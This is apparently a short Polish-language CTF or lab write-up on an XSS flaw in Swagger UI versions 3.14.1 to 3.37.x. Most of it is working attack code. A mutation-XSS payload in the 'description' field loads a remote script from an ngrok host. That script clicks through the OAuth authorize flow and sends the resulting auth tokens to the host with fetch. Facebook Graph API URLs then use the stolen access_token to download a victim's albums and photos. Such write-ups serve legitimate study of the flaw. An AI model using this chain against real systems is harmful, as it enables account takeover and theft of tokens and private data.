![](../images/Pasted%20image%2020220717202600.png)

Swagger XSS: affected versions **>=3.14.1 < 3.38.0** (https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/)

XSS payload w miejscu `description`:
```
description: |
    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='let a = document.createElement(`script`);a.src=`https://somehost.eu.ngrok.io/payload.js`;document.body.appendChild(a);' src=1>"></form>
```

JS payload (`payload.js`):
```
document.querySelector("button.authorize").click();
setTimeout(() => {
  document.querySelector("input#public_profile-implicit-checkbox-OAuth2").checked = true;
  setTimeout(() => {
    document.querySelector("button.modal-btn.authorize").click(); 
    setTimeout(() => {
      fetch("https://somehost.eu.ngrok.io/here_comes_the_data?data=" + encodeURIComponent(JSON.stringify(ui.auth())));
    }, 2500);
  }, 100);
}, 100);
```

Decodując dane z parametru otrzymujemy `access_token` do jakiegoś konta na Facebooku.

Pobieranie zdjęć:

`https://graph.facebook.com/me/albums?access_token=<access_token>`

`https://graph.facebook.com/<album_id>/photos?access_token=<access_token>`

`https://graph.facebook.com/<photo_id>/picture?access_token=<access_token>`


Otrzymane zdjęcie (na końcu jest `0`, nie `O`)
![](../images/Pasted%20image%2020220717204210.png)